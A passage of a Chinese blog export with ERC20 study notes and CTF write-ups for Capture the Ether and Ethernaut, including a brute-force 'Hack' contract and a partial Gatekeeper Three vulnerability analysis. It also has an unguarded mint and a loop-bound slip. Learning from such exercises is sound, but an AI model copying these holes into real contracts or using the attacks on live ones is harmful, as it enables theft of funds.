contracts/ERC/ERC20","date":"2023-03-30T22:47:10.000Z","updated":"2023-03-30T22:47:10.000Z","comments":true,"path":"2023/03/31/Smart contracts/ERC/ERC20/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/31/Smart%20contracts/ERC/ERC20/","excerpt":"","text":"引言EIP全称 Ethereum Imporvement Proposals(以太坊改进建议), 是以太坊开发者社区提出的改进建议, 是一系列以编号排定的文件, 类似互联网上IETF的RFC。 EIP可以是 Ethereum 生态中任意领域的改进, 比如新特性、ERC、协议改进、编程工具等等。 ERC全称 Ethereum Request For Comment (以太坊意见征求稿), 用以记录以太坊上应用级的各种开发标准和协议。如典型的Token标准(ERC20, ERC721)、名字注册(ERC26, ERC13), URI范式(ERC67), Library&#x2F;Package格式(EIP82), 钱包格式(EIP75,EIP85)。 ERC协议标准是影响以太坊发展的重要因素, 像ERC20, ERC223, ERC721, ERC777等, 都是对以太坊生态产生了很大影响。 所以最终结论：EIP包含ERC。 知识来源： 文章一 文章二 文章三 官方文档 1. 文章一的解读：1. 1 ERC20ERC20 是以太坊上的代币标准，来自 EIP20 。它实现了代币转账的基本逻辑： 账户余额 转账 授权转账 代币总供给 代币信息(可选)：名称，代号，小数位数 1.2 IERC20IERC20 是 ERC20 代币标准的接口合约，规定了ERC20 代币需要实习的函数和事件。之所以需要定义接口，是因为有了规范后，就存在所有的 ERC20 代币都通用的函数名称，输入参数，输出参数。在接口函数中，只需要定义函数名称，输入参数，输出参数，并不关心函数内部如何实现。由此，函数就分为内部和外部两个内容，一个重点是实现，另一个是对外接口，约定公共数据。这就是为什么需要ERC20。sol 和 IERC20.sol 两个文件实现一个合约。 1.2.1 事件IERC20 定义了 2 个事件：Transfer 事件 和 Approval 事件，分别在转账时被释放 123456789/** * @dev 释放条件：当 `value` 单位的货币从账户 (`from`) 转账到另一账户 (`to`)时. */event Transfer(address indexed from, address indexed to, uint256 value);/** * @dev 释放条件：当 `value` 单位的货币从账户 (`owner`) 授权给另一账户 (`spender`)时. */event Approval(address indexed owner, address indexed spender, uint256 value); 1.2.2 函数IERC20 定义了 6 个函数，提供了转移代币的基本功能，并允许代币获得批准，以便其他链上第三方使用。 totalSupply() 返回代币总供给 1234/** * @dev 返回代币总供给. */function totalSupply() external view returns (uint256); balanceOf() 返回账户余额 1234/** * @dev 返回账户`account`所持有的代币数. */function balanceOf(address account) external view returns (uint256); transfer() 转账 12345678/** * @dev 转账 `amount` 单位代币，从调用者账户到另一账户 `to`. * * 如果成功，返回 `true`. * * 释放 &#123;Transfer&#125; 事件. */function transfer(address to, uint256 amount) external returns (bool); allowance() 返回授权额度 123456/** * @dev 返回`owner`账户授权给`spender`账户的额度，默认为0。 * * 当&#123;approve&#125; 或 &#123;transferFrom&#125; 被调用时，`allowance`会改变. */function allowance(address owner, address spender) external view returns (uint256); approve() 授权 12345678/** * @dev 调用者账户给`spender`账户授权 `amount`数量代币。 * * 如果成功，返回 `true`. * * 释放 &#123;Approval&#125; 事件. */function approve(address spender, uint256 amount) external returns (bool); tranferFrom() 授权转账 123456789101112/** * @dev 通过授权机制，从`from`账户向`to`账户转账`amount`数量代币。转账的部分会从调用者的`allowance`中扣除。 * * 如果成功，返回 `true`. * * 释放 &#123;Transfer&#125; 事件. */function transferFrom( address from, address to, uint256 amount) external returns (bool); 1.3 实现ERC20​ 自己编写一个ERC20, 将IERC20 规定的函数简单的实现。 1.3.1 状态变量我们需要状态变量来记录账户余额，授权额度和代币信息。其中balanceOf，allowance 和 totalSupply 为public 类型， 会自动生成一个同名的getter 函数，实现 IERC20 规定的 balanceOf() ， allowance() 和 totalSupply() 。而 name，symbol，decimals 则对应代币的名称，代号和小数位数。 注意：用 override修饰 public变量，会重写继承父合约的与变量名同名的getter函数，比如 IERC20中的 balanceOf（） 函数 12345678910mapping(address =&gt; uint256) public override balanceOf;mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance;uint256 public override totalSupply; // 代币总供给string public name; // 名称string public symbol; // 代号uint8 public decimals = 18; // 小数位数 解读：嵌套映射 mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance; 我的理解是先执行内层的 mapping 映射，得到内层 address 地址，对应的 uint256 的值，然后再执行外层 mapping 外层的address 对应了内层 address 映射出的值，有点像 Java 里的键值对，两个address 唯一确定一个uint256？我目前的理解是这样，日后等我知识储备多一点我再来解决这里的疑惑 1.3.2 函数 构造函数：初始化代币名称、代号。 1234constructor(string memory name_, string memory symbol_)&#123; name = name_; symbol = symbol_;&#125; transfer() 函数：实现 IERC20 中的 transfer 函数，代币转账逻辑。调用方扣除 amount 数量代币， 接收方增加相应的代币。（土狗币会魔改这个函数，加入税收、分红、抽奖等逻辑）– (⊙﹏⊙)我不理解这个是什么 123456function transfer(address recipient, uint amount) external override returns (bool) &#123; balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true;&#125; approve() 函数：实现IERC20 中的 approve 函数，代币授权逻辑。被接收方 spender 可以支配授权方的 amount 数量的代币。spender 可以是 EOA 账户，也可以是合约账户：当你使用 uniswap 交易代币时，你需要 将代币授权给 uniswap 合约。 12345function approve(address spender, uint amount) external override returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;&#125; transferFrom()函数： 实现了IERC20 中的 transferFrom 函数，授权转账逻辑。被接收方将授权方sender的amount 数量的代币转账给接收方 recipient。 1234567891011function transferFrom( address sender, address recipient, uint amount) external override returns (bool) &#123; allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true;&#125; mint() 函数：铸造代币函数，不在 IERC20 标准中。这里为了教程方便，任何人可以铸造任意数量的代币，实现应用中会加权限管理，只用 owner 可以铸造代币： 12345function mint(uint amount) external &#123; balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount);&#125; burn() 函数：销毁代币函数，不在IERC20 标准中。 12345function burn(uint amount) external &#123; balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount);&#125; 1.4 在 Remix 上，发行 ERC20 代币网页版的 Remix 经常会出现 bug 的，我刚刚就是一直卡在编译不通过那里，过了一会就可以编译通过了，有两种导入 IERC20 的方式，①直接从网上导入不过这个对网络的要求比较高，网络不好就贵给你报错；② 将网上的 IERC20 源码复制下来，新建一个同名的合约，直接相对路径导入就可以了，即 import &quot;./IERC20.sol&quot;; 1.4.1 在Remix 上编译部署 在Remix上编译好ERC20合约，在部署栏输入构造函数的参数，name_和symbol_都设为biyou，然后点击transact键进行部署。 这样，我们就创建好了WTF代币。我们需要运行mint()函数来给自己铸造一些代币。点开Deployed Contract中的ERC20合约，在mint函数那一栏输入100并点击mint按钮，为自己铸造100个WTF代币 最后通过调用 balanceOf函数，将我的测试地址作为参数，传入并查询我的余额，如显示为100，则成功 IERC20.sol： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// SPDX-License-Identifier: MIT// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)pragma solidity ^0.8.0;/** * @dev Interface of the ERC20 standard as defined in the EIP. */interface IERC20 &#123; /** * @dev Emitted when `value` tokens are moved from one account (`from`) to * another (`to`). * * Note that `value` may be zero. */ event Transfer(address indexed from, address indexed to, uint256 value); /** * @dev Emitted when the allowance of a `spender` for an `owner` is set by * a call to &#123;approve&#125;. `value` is the new allowance. */ event Approval(address indexed owner, address indexed spender, uint256 value); /** * @dev Returns the amount of tokens in existence. */ function totalSupply() external view returns (uint256); /** * @dev Returns the amount of tokens owned by `account`. */ function balanceOf(address account) external view returns (uint256); /** * @dev Moves `amount` tokens from the caller&#x27;s account to `to`. * * Returns a boolean value indicating whether the operation succeeded. * * Emits a &#123;Transfer&#125; event. */ function transfer(address to, uint256 amount) external returns (bool); /** * @dev Returns the remaining number of tokens that `spender` will be * allowed to spend on behalf of `owner` through &#123;transferFrom&#125;. This is * zero by default. * * This value changes when &#123;approve&#125; or &#123;transferFrom&#125; are called. */ function allowance(address owner, address spender) external view returns (uint256); /** * @dev Sets `amount` as the allowance of `spender` over the caller&#x27;s tokens. * * Returns a boolean value indicating whether the operation succeeded. * * IMPORTANT: Beware that changing an allowance with this method brings the risk * that someone may use both the old and the new allowance by unfortunate * transaction ordering. One possible solution to mitigate this race * condition is to first reduce the spender&#x27;s allowance to 0 and set the * desired value afterwards: * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 * * Emits an &#123;Approval&#125; event. */ function approve(address spender, uint256 amount) external returns (bool); /** * @dev Moves `amount` tokens from `from` to `to` using the * allowance mechanism. `amount` is then deducted from the caller&#x27;s * allowance. * * Returns a boolean value indicating whether the operation succeeded. * * Emits a &#123;Transfer&#125; event. */ function transferFrom(address from, address to, uint256 amount) external returns (bool);&#125; ERC20_self.sol 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// SPDX-License-Identifier: MITpragma solidity ^0.8.4;// import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;import &quot;./IERC20.sol&quot;;contract ERC20_self is IERC20 &#123; mapping(address =&gt; uint256) public override balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public override allowance; uint256 public override totalSupply; // 代币总供给 string public name; // 名称 string public symbol; // 代号 uint8 public decimals = 18; // 小数位数 constructor(string memory name_, string memory symbol_)&#123; name = name_; symbol = symbol_; &#125; function transfer(address recipient, uint amount) external override returns (bool) &#123; balanceOf[msg.sender] -= amount; balanceOf[recipient] += amount; emit Transfer(msg.sender, recipient, amount); return true; &#125; function approve(address spender, uint amount) external override returns (bool) &#123; allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; &#125; function transferFrom( address sender, address recipient, uint amount ) external override returns (bool) &#123; allowance[sender][msg.sender] -= amount; balanceOf[sender] -= amount; balanceOf[recipient] += amount; emit Transfer(sender, recipient, amount); return true; &#125; function mint(uint amount) external &#123; balanceOf[msg.sender] += amount; totalSupply += amount; emit Transfer(address(0), msg.sender, amount); &#125; function burn(uint amount) external &#123; balanceOf[msg.sender] -= amount; totalSupply -= amount; emit Transfer(msg.sender, address(0), amount); &#125;&#125; 2. 文章二解读：2.1 简介 简单总结：是一个 Token 的标准接口 摘要：此标准允许在智能合约为token实现标准API。 本标准提供了转移token的基本功能，并允许链上第三方使用token 目的：标准接口可以让以太网上的任何token被其他应用程序重新使用：从钱包到去中心化的交易所 2.2 详细解读 变量、函数及事件 name: 返回令牌的名字，例如“MyToken” 1function name() view returns (string name) symbol：返回令牌的符号，比如￥ 1function symbol() constant returns (string symbol) decimals：返回token使用的小数点后几位， 比如 8，表示将1个token数量分为100000000份 1function decimals() view returns (uint8 decimals) totalSupply：返回token的总供应量 1function totalSupply() constant returns (uint256 totalSupply) balanceOf：返回地址_owner的账户余额 1function balanceOf(address _owner) constant returns (uint256 balance) transfer：转移_value数量的token到地址_to，并且必须触发Transfer事件。 如果_from帐户余额没有足够的token来支出，该方法应该抛出异常。注意：_value&#x3D;0必须被视为正常转移并触发Transfer事件 1function transfer(address _to, uint256 _value) returns (bool success) transferFrom：从地址_from发送_value个token到地址_to，必须触发Transfer事件。transferFrom方法用于提现流程，允许合约为你转移token。这可以用于允许合约为你转让代币或收取费用。除了_from帐户通过某种机制授权消息的发送者之外，否则该方法应该抛出异常。注意：_value&#x3D;0须被视为正常转移并触发Transfer事件 1function transferFrom(address _from, address _to, uint256 _value) returns (bool success) approve：允许_spender多次从你的帐户提现，最高数量是_value。 如果再次调用此函数，它将以_value覆盖当前的值。注意：为了防止向量攻击，客户端需要确认以这样的方式创建用户接口，即在为同一个花费者设置另一个值之前，先将它的值设置为0。虽然合约本身不应该强制执行，以前部署的合同允许向后兼容 1function approve(address _spender, uint256 _value) returns (bool success) allowance：返回被允许从_owner提取到_spender余额 1function allowance(address _owner, address _spender) constant returns (uint256 remaining) 事件： Transfer：当token被转移(即使是0值)时必须被触发 1event Transfer(address indexed _from, address indexed _to, uint256 _value) Approval：当成功调用approve(address _spender, uint256 _value)后必须被触发 1event Approval(address indexed _owner, address indexed _spender, uint256 _value) 3.文章三解读：ERC-20 标准以太坊上的一个代币协议，所有基于以太坊开发的代币合约都遵守这个协议。 3.1 协议中包含的方法：123456789101112131415161718192021222324252627282930313233343536//1.name//返回string类型的ERC20代币的名字，例如：StatusNetworkfunction name() constant returns (string name) //2.symbol//返回string类型的ERC20代币的符号，也就是代币的简称，例如：SNTfunction name() constant returns (string name) //3.decimals//支持几位小数点后几位。如果设置为3。也就是支持0.001表示。function symbol() constant returns (string symbol)//4.totalSupply//发行代币的总量，可以通过这个函数来获取。所有智能合约发行的代币总量是一定的，totalSupply必须设置初始值。如果不设置初始值，这个代币发行就说明有问题。function totalSupply() constant returns (uint256 totalSupply)//5.balanceOf//输入地址，可以获取该地址代币的余额。function balanceOf(address _owner) constant returns (uint256 balance)//6.transfer//调用transfer函数将自己的token转账给_to地址，_value为转账个数function transfer(address _to, uint256 _value) returns (bool success)//7.approve//批准_spender账户从自己的账户转移_value个token。可以分多次转移。function approve(address _spender, uint256 _value) returns (bool success)//8.transferFrom//与approve搭配使用，approve批准之后，调用transferFrom函数来转移token。function transferFrom(address _from, address _to, uint256 _value) returns (bool success)//9.allowance//返回_spender仍然允许从_owner提取的金额。function allowance(address _owner, address _spender) constant returns (uint256 remaining) 4.2 协议中包含的事件：12345678//1.Transfer//在发生代币转移时必须触发，包括生成新代币event Transfer(address indexed _from, address indexed _to, uint256 _value)//2.Approval//成功调用approve(address _spender, uint256 _value)方法时触发event Approval(address indexed _owner, address indexed _spender, uint256 _value) 4.3 例子：账户A有1000个ETH，想允许B账户随意调用100个ETH A账户按照以下形式调用approve函数approve(B,100) 当B账户想用这100个ETH中的10个ETH给C账户时，则调用transferFrom(A, C, 10) 这时调用allowance(A, B)，可以查看B账户还能够调用A账户多少个token。 这个理解，我感觉还是比较容易理解allowance的： 这时调用allowance(A, B)，可以查看 B账户还能够调用 A账户多少个token","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ERC","slug":"Smart-contracts/ERC","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ERC/"}],"tags":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/tags/Smart-contracts/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"}]},{"title":"Guess the secret number","slug":"Smart contracts/capther the ether/Guess the secret number","date":"2023-03-20T04:47:10.000Z","updated":"2023-03-20T04:47:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Guess the secret number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Guess%20the%20secret%20number/","excerpt":"","text":"Guess the secret number1. 题目 1.1 Putting the answer in the code makes things a little too easy. This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash! 1.2 题目代码： 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123; bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function GuessTheSecretNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (keccak256(n) == answerHash) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 这是我第一次感觉自己能想出来的题目了。。。。 2.2 反正 uint8 的范围是 0-256 嘛，直接 循环一个一个蛮力法，一个一个试出来 2.3 写一个Hack 合约来计算，哈希值为 ：0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365 的数字 Hack 合约代码： 1234567891011121314contract Hack &#123; uint8 public number; bytes32 answer = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function f() public returns(uint8) &#123; for (uint8 i = 0; i &lt;= 256; i++) &#123; if (keccak256(i) == answer) &#123; number = i; break; &#125; &#125; return number; &#125;&#125; 运行求出来的结果是 ：170 3. 解题 3.1 部署合约 3.2 将 170 作为参数，调用guss() 函数 3.3 同时前两步操作都需要将 msg.value 设置为 1 ether","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the number","slug":"Smart contracts/capther the ether/Guess the number","date":"2023-03-20T04:39:10.000Z","updated":"2023-03-20T04:39:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Guess the number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Guess%20the%20number/","excerpt":"","text":"Guess the number1. 题目 I’m thinking of a number. All you have to do is guess it. 题目代码： 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123; uint8 answer = 42; function GuessTheNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. 分析 2.1 这题是猜数字，但是他的数字是写死的，即42 。我们直接猜42 就好了 2.2 但是部署和 猜数字都需要支付 1ether ，即两个，如果猜对了他就会返回之前支付的ether 3. 解题 3.1 部署，msg.value &#x3D; 1 ether 3.2 调用 guss() 函数 3.3 查看合约余额","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Choose a nickname","slug":"Smart contracts/capther the ether/Choose a nickname","date":"2023-03-20T02:39:10.000Z","updated":"2023-03-20T02:39:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Choose a nickname/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Choose%20a%20nickname/","excerpt":"","text":"Choose a nickname1. 题目 1.1 智能合约CaptureTheEther会记录每个玩家的昵称。要完成此挑战，请将您的昵称设置为非空字符串。智能合约在地址 的 Ropsten 测试网络上运行0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee。 1.2 题目代码 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.4.21;// Relevant part of the CaptureTheEther contract.contract CaptureTheEther &#123; mapping (address =&gt; bytes32) public nicknameOf; function setNickname(bytes32 nickname) public &#123; nicknameOf[msg.sender] = nickname; &#125;&#125;// Challenge contract. You don&#x27;t need to do anything with this; it just verifies// that you set a nickname for yourself.contract NicknameChallenge &#123; CaptureTheEther cte = CaptureTheEther(msg.sender); address player; // Your address gets passed in as a constructor parameter. function NicknameChallenge(address _player) public &#123; player = _player; &#125; // Check that the first character is not null. function isComplete() public view returns (bool) &#123; return cte.nicknameOf(player)[0] != 0; &#125;&#125; 2. 分析 2.1 只需要将成功调用setNickname() 函数即可 2.2 考点在于如何将字符串转为64位 16进制的数据类型 我在idea 编写了一个程序来解决这个问题 123456789101112131415161718192021222324252627282930313233package daily_temp;/** * @Auther: 柚子 * @Date:2023/3/24年03月24日 15:43 * @Description:daily_temp * @version: 1.0 */public class convertStringToHex &#123; public static void main(String[] args) &#123; covertStringToHex(&quot;biyou&quot;); &#125; static void covertStringToHex(String str) &#123; StringBuffer sb = new StringBuffer(); char[] chars = str.toCharArray(); for(char c : chars) &#123; String charToHex = Integer.toHexString(c); sb.append(charToHex); &#125; int length = sb.length(); for (int i = 0; i &lt; 64 - length; i++) &#123; sb.append(0); &#125; System.out.println(&quot;0x&quot; + sb.toString()); &#125;&#125; 输入为 biyou 运行结果为： 以 0x6269796f75000000000000000000000000000000000000000000000000000000 为参数，调用 setNickname() 函数即可 3. 解题 3.1 部署 3.2 将转化好的数据以参数的形式传入 3.3","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Call me","slug":"Smart contracts/capther the ether/Call me","date":"2023-03-20T02:37:10.000Z","updated":"2023-03-20T02:37:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Call me/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Call%20me/","excerpt":"","text":"Call me1. 题目 1.1 部署以下合约 1.2 调用命名的函数callme 12345678910// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125;&#125; 2. 分析 2.1 部署，调用即可 3. 解题 3.1 3.2 调用 callme() 函数，再查看isComplete的值","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Deploy a contract","slug":"Smart contracts/capther the ether/Deploy a contract","date":"2023-03-20T02:33:10.000Z","updated":"2023-03-20T02:33:10.000Z","comments":true,"path":"2023/03/20/Smart contracts/capther the ether/Deploy a contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/Smart%20contracts/capther%20the%20ether/Deploy%20a%20contract/","excerpt":"","text":"Deploy a contracttips： 宝藏博客1. 题目要求 1.1 To complete this challenge, you need to: Install MetaMask. Switch to the Ropsten test network. Get some Ropsten ether. Clicking the “buy” button in MetaMask will take you to a faucet that gives out free test ether. After you’ve done that, press the red button on the left to deploy the challenge contract. You don’t need to do anything with the contract once it’s deployed. Just click the “Check Solution” button to verify that you deployed successfully. 1.2 题目代码： 12345678pragma solidity ^0.4.21;contract DeployChallenge &#123; // This tells the CaptureTheFlag contract that the challenge is complete. function isComplete() public pure returns (bool) &#123; return true; &#125;&#125; 2. 分析 2.1 该题很简单，直接放到remix 上面部署就ok 了 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Gatekeeper Three","slug":"Smart contracts/ethernaut/Gatekeeper Three","date":"2023-03-13T06:33:10.000Z","updated":"2023-03-13T06:33:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/Gatekeeper Three/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/Gatekeeper%20Three/","excerpt":"","text":"Gatekeeper Three1. 题目要求 1.1 应对大门并成为进入者。 可能有帮助的事情： 调用低级函数的返回值。 注意语义。 刷新存储在以太坊中的工作方式 1.2 题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick; uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; function trickInit() public &#123; trick = address(this); &#125; function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allow_enterance = false; SimpleTrick public trick; function construct0r() public &#123; owner = msg.sender; &#125; modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; modifier gateTwo() &#123; require(allow_enterance == true); _; &#125; modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125; function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125; function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125; function enter() public gateOne gateTwo gateThree returns (bool entered) &#123; entrant = tx.origin; return true; &#125; receive () external payable &#123;&#125;&#125; 2. 分析tips: 参考博客注意语义；这是一个巨大的赠品。首先想到的是旧版本Solidity 0.4.x中的一个老挑战，那里没有constructor关键字，相反，我们必须创建一个与合约同名的函数。 然而，我们现在已经进入了 0.8.18 时代；还有什么可能出错？我快速浏览了一下合同，立即注意到了一些奇怪的地方。快去看看；你注意到了吗？ 1function construct0r() public &#123;owner = msg.sender;&#125; 男孩，我知道这有问题，100%。但直到现在，我仍然不知道我要处理这份合同。 我会将我最初的想法记录为评论。并非所有这些都必须正确，但在阅读智能合约时记下是一个很好的做法。每当我处理一个新的代码库时，我都会使用类似Inline Bookmarks 的东西。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889*// SPDX-License-Identifier: MIT*pragma solidity ^0.8.0;contract SimpleTrick &#123; GatekeeperThree public target; address public trick;//maybe need a function to get the current timestamp? uint private password = block.timestamp; constructor (address payable _target) &#123; target = GatekeeperThree(_target); &#125; //first time running this will set the password as current timestamp? //although it is private, doens&#x27;t mean we cannot get the vaule back function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; //everyone can call this and it will set trick to the contract address function trickInit() public &#123; trick = address(this); &#125; //if the caller of frunction is this address and //this address is not trick, then it will call target.getAllowance(password) function trickyTrick() public &#123; if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123; target.getAllowance(password); &#125; &#125;&#125;contract GatekeeperThree &#123; address public owner; address public entrant; bool public allow_enterance = false; SimpleTrick public trick;//everyone can call this, so owner can be anyone function construct0r() public &#123; owner = msg.sender; &#125;//to pass we have to change the owner, but let the tx.origin be the contract? modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125;//straight forward stuff modifier gateTwo() &#123; require(allow_enterance == true); _; &#125;//this gate reuqire us to drain the address balance? not sure modifier gateThree() &#123; if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123; _; &#125; &#125;//need to get the password to pass gate_two function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125;//this function can create a new trick contract? using this contract addr as//constructor argument function createTrick() public &#123; trick = new SimpleTrick(payable(address(this))); trick.trickInit(); &#125;//pass all the gate function enter() public gateOne gateTwo gateThree returns (bool entered) &#123; entrant = tx.origin; return true; &#125; receive () external payable &#123;&#125;&#125; 所以基本上最终目标是调用enter()函数（可以是 EOA 或我们构建的智能合约……对吗？），它可以传递gateOne、gateTwo和gateThree修饰符。让我们仔细看看每个门： 1号门1234modifier gateOne() &#123; require(msg.sender == owner); require(tx.origin != owner); _; &#125; 让我们回顾一下tx.origin。 tx.origin是最初发起交易的地址，无论在此过程中进行了多少次合约调用。 msg.sender是当前函数的直接调用者的地址。 在调用链 A-&gt;B-&gt;C-&gt;D 中，在 D 内部，msg.sender将是 C，并且tx.origin将是 A。 满足此修饰符的一种方法是将另一个合约设置为所有者，而我们（一个 EOA）将成为tx.origin. 让我们抱着这个念头，看看能不能继续通过其他的门。 2号门1234567891011121314151617181920modifier gateTwo() &#123;require(allow_enterance == true);_;&#125;function getAllowance(uint _password) public &#123; if (trick.checkPassword(_password)) &#123; allow_enterance = true; &#125; &#125;//Simple Trick Contract: uint private password = block.timestamp;//................///function checkPassword(uint _password) public returns (bool) &#123; if (_password == password) &#123; return true; &#125; password = block.timestamp; return false; &#125; 如果我们可以输入正确的密码作为 的参数getAllowance()，这必须通过trick.checkPassword()函数，我们就可以破解门 2. 如何找到密码？我们需要一种方法来检查私有变量password。深入了解 Solidity Storage可能会有所帮助。 3号门123456modifier gateThree () &#123; if ( address ( this ).balance &gt; 0.001 ether &amp;&amp; payable (owner). send ( 0.001 ether) == 